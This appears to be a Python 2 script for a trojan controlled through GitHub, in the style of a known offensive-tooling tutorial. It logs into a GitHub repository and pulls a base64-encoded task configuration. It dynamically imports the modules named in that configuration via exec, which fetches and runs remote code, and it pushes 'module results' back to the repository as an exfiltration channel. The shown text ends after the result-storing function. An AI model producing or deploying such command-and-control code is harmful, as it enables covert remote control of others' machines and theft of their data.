#!/usr/bin/python

import json,base64,sys,time,imp,random,threading,Queue,os

from github3 import login

Tr_id = "abc" 

Tr_config = "%s.json" % Tr_id
data_path = "data/%s/"
Tr_modules = []
configured = False
task_queue = Queue.Queue()

def connect_to_github():
	gh = login(username="youruser",password="yourpass")
	repo = gh.repository("youruser", "Cbacc")
	branch = repo.branch("master")

	return gh,repo,branch

def get_file_contents(filepath):
	gh,repo,branch = connect_to_github()
	tree = branch.commit.commit.tree.recurse()

	for filename in tree.tree:
		if filepath in filename.path:
			print "[*] Found file %s" % filepath
			blob = repo.blob(filename._json_data['sha'])
			return blob.content 
	return None

def get_tr_config():
	global configured
	config_json = get_file_contents(Tr_config)
	config = json.loads(base64.b64decode(config_json))
	configured = True 

	for task in config:

		if task['module'] not in sys.modules:
			exec("import %s" % task['module'])
	return config

def store_module_result(data):

	gh,repo,branch = connect_to_github()
	remote_path = "data/%s/%d.data" % (Tr_id,random.randint(1000,100000))
	repo.create_file(remote_path,"Commit message",base64.b64decode(data))

	return

